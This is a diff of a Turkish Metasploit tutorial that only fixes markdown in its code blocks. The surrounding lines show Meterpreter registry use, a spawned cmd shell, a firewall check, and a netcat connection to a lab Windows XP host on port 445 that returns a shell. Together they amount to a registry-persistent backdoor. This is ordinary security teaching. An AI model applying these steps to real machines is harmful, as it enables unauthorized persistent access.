@@ -31,7 +31,7 @@ Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok 
 
 ```bash
 meterpreter > reg
-Usage: reg **[**command**]** **[**options]
+Usage: reg [command] [options]
 
 Interact with the target machine's registry.
 
@@ -133,7 +133,7 @@ Doğrudan Registry ayarlarından yapabileceğinizi gibi `netsh` komutu ile de fi
 meterpreter > execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
-Microsoft Windows XP **[**Version 5.1.2600]
+Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\ >
 ```
@@ -149,17 +149,17 @@ Netsh firewall show opmode
 
 Domain profile configuration:
 -------------------------------------------------------------------
-Operational mode                  **=** Enable
-Exception mode                    **=** Enable
+Operational mode                  = Enable
+Exception mode                    = Enable
 
 Standard profile configuration (current):
 -------------------------------------------------------------------
-Operational mode                  **=** Enable
-Exception mode                    **=** Enable
+Operational mode                  = Enable
+Exception mode                    = Enable
 
 Local Area Connection firewall configuration:
 -------------------------------------------------------------------
-Operational mode                  **=** Enable
+Operational mode                  = Enable
 ```
 
 
@@ -211,8 +211,8 @@ Hedef sistem tekrar başladığında `nc.exe` otomatik olarak çalışacak ve d�
 ```bash
 root@kali:~# nc -v 172.16.104.128 445
 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
-(UNKNOWN) **[**172.16.104.128] 445 (?) open
-Microsoft Windows XP **[**Version 5.1.2600]
+(UNKNOWN) [172.16.104.128] 445 (?) open
+Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\ > dir
